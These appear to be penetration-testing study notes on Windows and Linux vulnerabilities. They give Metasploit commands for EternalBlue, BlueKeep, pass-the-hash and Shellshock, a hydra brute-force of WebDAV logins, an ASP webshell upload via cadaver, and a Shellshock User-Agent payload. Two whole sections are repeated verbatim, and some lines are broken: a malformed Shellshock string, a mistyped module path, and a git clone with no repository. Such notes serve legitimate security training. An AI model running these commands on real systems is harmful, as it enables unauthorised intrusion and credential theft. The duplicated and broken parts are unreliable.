---

---

--- 

** Vulnerability Assessment **

- **Overview of Windows Vulnerabilities:**
    
    - Windows operating systems have been developed in the C programming language. By default, Windows is not configured to run securely and requires proactive implementation of security practices to ensure safe operation. Newly discovered vulnerabilities are not immediately patched by Microsoft, and due to the fragmented structure of the Windows OS, many vulnerabilities remain unpatched.
        
    - Types of Windows Vulnerabilities:
        
        - Information Disclosure
            
        - Buffer Overflow
            
        - Remote Code Execution
            
        - Privilege Escalation
            
        - Denial of Service
            
- **Frequently Exploited Windows Services:**
    
    - **Microsoft IIS (TCP ports 80/443):** Proprietary web server software developed by Microsoft that runs on Windows.
        
    - **WebDAV (TCP ports 80/443):** HTTP extension that allows clients to update, delete, move, and copy files on a web server. Enables a web server to act as a file server.
        
    - **SMB/CIFS (TCP port 445):** Network and file sharing protocol used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
        
    - **RDP (TCP port 3389):** Proprietary GUI remote access protocol developed by Microsoft and used to remotely authenticate and interact with a Windows system.
        
    - **WinRM (TCP port 5986/443):** Windows Remote Management protocol that can facilitate remote access to Windows systems.
        
    
    N.B.: This is not an exhaustive list, especially in the context of Active Directory (AD) penetration testing.
    

** Vulnerability Scanning with MSF **

- **Vulnerability scanning & detection** is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.
    
- **Using MSF to search and use exploit/scan modules:**
    

```
msf5 > db_nmap -sS -sV -O TargetIP@ # performs an Nmap scan and saves the result into the DB used by MSF

msf5 > search type:type_of_modules name:what_you_searching_for

msf5 exploit(path/to/the/exploit) > info # gives info about the module

msf5 > use scanner/smb/smb_ms17_010 # scans if host is vulnerable to MS17-010 (EternalBlue)

msf5 > use windows/smb/smb17_010_eternalblue # exploit EternalBlue

msf5 > load db_autopwn # enumerates exploits for each of the open ports of the target

msf5 > db_autopwn [options] # autopwn usage

msf5 > analyze
```

- **Using SearchSploit:**
    

```
searchsploit "name_of_service"
```

** WebDAV Vulnerabilities **

- **Overview:**
    
    - IIS is a proprietary extensible web server software developed by Microsoft for use with the NT family. It can be used to host web applications and provides administrators with a GUI for managing websites. It supports both static and dynamic content (ASP.NET, PHP).
        
    - WebDAV is a set of HTTP extensions that allow users to collaboratively edit and manage files on remote web servers. It runs on top of IIS.
        
- **Exploitation:**
    
    1. Identify whether WebDAV has been configured to run on the IIS web server.
        
    2. Perform a brute-force attack on the WebDAV server to identify valid credentials.
        
    3. Once authenticated, upload a malicious `.asp` payload to execute code or gain a reverse shell.
        
- **Tools:** davtest, cadaver
    

```
nmap -sV -p 80 --script=http-enum TargetIP@ # enumerate directories; can reveal WebDAV directory

hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords TargetIP@ http-get /webdav/ # brute-force WebDAV credentials

davtest -auth username:password -url http://TargetIP@/webdav # test for vulnerabilities (e.g., file upload)

cadaver http://TargetIP@/webdav # pseudo shell to interact with WebDAV
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp # upload a webshell to the WebDAV directory
```

** Vulnerability Assessment **

- **Overview of Windows Vulnerabilities:**
    
    - Windows operating systems have been developed in the C programming language. By default, Windows is not configured to run securely and requires proactive implementation of security practices to ensure safe operation. Newly discovered vulnerabilities are not immediately patched by Microsoft, and due to the fragmented structure of the Windows OS, many vulnerabilities remain unpatched.
        
    - Types of Windows Vulnerabilities:
        
        - Information Disclosure
            
        - Buffer Overflow
            
        - Remote Code Execution
            
        - Privilege Escalation
            
        - Denial of Service
            
- **Frequently Exploited Windows Services:**
    
    - **Microsoft IIS (TCP ports 80/443):** Proprietary web server software developed by Microsoft that runs on Windows.
        
    - **WebDAV (TCP ports 80/443):** HTTP extension that allows clients to update, delete, move, and copy files on a web server. Enables a web server to act as a file server.
        
    - **SMB/CIFS (TCP port 445):** Network and file sharing protocol used to facilitate the sharing of files and peripherals between computers on a local network (LAN).
        
    - **RDP (TCP port 3389):** Proprietary GUI remote access protocol developed by Microsoft and used to remotely authenticate and interact with a Windows system.
        
    - **WinRM (TCP port 5986/443):** Windows Remote Management protocol that can facilitate remote access to Windows systems.
        
    
    N.B.: This is not an exhaustive list, especially in the context of Active Directory (AD) penetration testing.
    

** Vulnerability Scanning with MSF **

- **Vulnerability scanning & detection** is the process of scanning a target for vulnerabilities and verifying whether they can be exploited.
    
- **Using MSF to search and use exploit/scan modules:**
    

```
msf5 > db_nmap -sS -sV -O TargetIP@ # performs an Nmap scan and saves the result into the DB used by MSF

msf5 > search type:type_of_modules name:what_you_searching_for

msf5 exploit(path/to/the/exploit) > info # gives info about the module

msf5 > use scanner/smb/smb_ms17_010 # scans if host is vulnerable to MS17-010 (EternalBlue)

msf5 > use windows/smb/smb17_010_eternalblue # exploit EternalBlue

msf5 > load db_autopwn # enumerates exploits for each of the open ports of the target

msf5 > db_autopwn [options] # autopwn usage

msf5 > analyze
```

- **Using SearchSploit:**
    

```
searchsploit "name_of_service"
```

** WebDAV Vulnerabilities **

- **Overview:**
    
    - IIS is a proprietary extensible web server software developed by Microsoft for use with the NT family. It can be used to host web applications and provides administrators with a GUI for managing websites. It supports both static and dynamic content (ASP.NET, PHP).
        
    - WebDAV is a set of HTTP extensions that allow users to collaboratively edit and manage files on remote web servers. It runs on top of IIS.
        
- **Exploitation:**
    
    1. Identify whether WebDAV has been configured to run on the IIS web server.
        
    2. Perform a brute-force attack on the WebDAV server to identify valid credentials.
        
    3. Once authenticated, upload a malicious `.asp` payload to execute code or gain a reverse shell.
        
- **Tools:** davtest, cadaver
    

```
nmap -sV -p 80 --script=http-enum TargetIP@ # enumerate directories; can reveal WebDAV directory

hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords TargetIP@ http-get /webdav/ # brute-force WebDAV credentials

davtest -auth username:password -url http://TargetIP@/webdav # test for vulnerabilities (e.g., file upload)

cadaver http://TargetIP@/webdav # pseudo shell to interact with WebDAV
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp # upload a webshell to the WebDAV directory
```

** Vulnerability Analysis **

- **Vulnerability Analysis: EternalBlue**
    
    - MS17-010/CVE-2017-0144 is a collection of Windows vulnerabilities that allow attackers to remotely execute arbitrary code and gain access to a Windows system and, potentially, the network it is part of. Developed by the NSA and leaked by the Shadow Brokers group in 2017, EternalBlue was used in the WannaCry ransomware attack. Affected versions include Windows Vista, 7, 8.1, 10, Server 2012, and Server 2016.
        
- **Tools:** AutoBlue_MS17-010
    
- **Exploitation and Scanning:**
    

```
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 TargetIP@ # scan for EternalBlue vulnerability

# Manual exploitation:
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
# follow the README instructions

# Using MSF:
msf6 > use windows/smb/ms17_010_eternalblue
```

- **Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep):**
    
    - BlueKeep is a remote code execution vulnerability in the Windows Remote Desktop Protocol. It allows attackers to gain access to kernel memory. Affected versions: Windows XP, Vista, 7, Server 2008 & 2008 R2.
        

```
msf5 > use scanner/rdp/cve_2019_0708_bluekeep

msf5 > use windows/rdp/cve_2019_0708_bluekeep_rce
```

N.B.: Kernel exploits may crash the system. Use with caution, and avoid during real-world engagements.

- **Pass-the-Hash Attacks:**
    
    - This technique captures NTLM hashes or clear-text passwords and uses them for legitimate authentication without cracking the password.
        
    - **Tools:** Metasploit PsExec module, CrackMapExec
        

```
msf6 > use windows/http/badblue_passthru # extract NTLM hashes from BadBlue vulnerability

msf6 > use windows/smb/psexec # pass-the-hash exploit

crackmapexec smb TargetIP@ -u user -p "NTLMHash"
```

- **Frequently Exploited Linux Services:**
    
    - **Apache (TCP ports 80/443):** Open-source cross-platform web server.
        
    - **SSH (TCP port 22)**
        
    - **FTP (TCP port 21)**
        
    - **Samba (TCP port 445):** SMB implementation for Linux, allows interoperability with Windows systems.
        
- **Vulnerability Analysis: Bash CVE-2014-6271 (Shellshock):**
    
    - Shellshock is a family of vulnerabilities in the Bash shell allowing remote command execution. Apache servers running CGI scripts are especially at risk.
        
- **Exploitation Process:**
    

```
git clone # (repository not specified in original)
nmap -sV TargetIP@ --script=http-shellshock --script-args "http-shellshock.uri=/script.cgi"

# Manual exploitation using Burp:
# Modify User-Agent header to: () { ;; }; echo; echo; /bin/bash -c 'command'

# MSF automated exploitation:
msf6 > use multi/http/apache_mod_cgi_bash_env_exec
```

** Vulnerability Scanning **

- **Vulnerability Scanning with Nessus:**
    
    - Nessus can be used to scan a system for known vulnerabilities. Results can be imported into MSF for deeper analysis and exploitation. Nessus also provides details such as CVE codes.
        

```
# Installing Nessus:
1. Download the .deb file from the official website
2. chmod +x filename.deb
3. sudo dpkg -i filename.deb

# Importing the Nessus scan into MSF:
msf6 > db_import /path/to/scan.nessus

msf6 > hosts

msf6 > services

msf6 > vulns

msf6 > vulns -p Port_number
```

- **Web App Vulnerability Scanning with WMAP:**
    
    - WMAP is a Metasploit plugin for scanning web applications.
        

```
msf5 > load wmap

msf5 > wmap_sites -l

msf5 > wmap_targets -l

msf5 > wmap_sites -a TargetIP@ # add a target

msf5 > wmap_targets -t http://TargetIP@ # set target URL or directory

msf5 > wmap_run -t # run scan with default modules

msf5 > wmap_vulnerabilities
```

---
